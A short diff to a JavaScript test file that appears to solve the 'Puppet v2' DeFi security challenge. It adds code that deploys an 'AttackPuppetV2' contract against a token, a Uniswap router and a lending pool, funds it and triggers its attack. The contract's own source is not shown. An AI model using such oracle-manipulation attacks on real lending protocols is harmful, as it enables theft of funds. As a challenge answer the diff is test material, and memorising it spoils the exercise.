@@ -83,6 +83,11 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackerContractFactory = await ethers.getContractFactory('AttackPuppetV2', player);
+        this.attackerContract = await AttackerContractFactory.deploy(token.address, uniswapRouter.address, lendingPool.address);
+
+        await token.connect(player).transfer(this.attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await this.attackerContract.attack({value: PLAYER_INITIAL_ETH_BALANCE  - 4n * 10n ** 17n});
     });
 
     after(async function () {
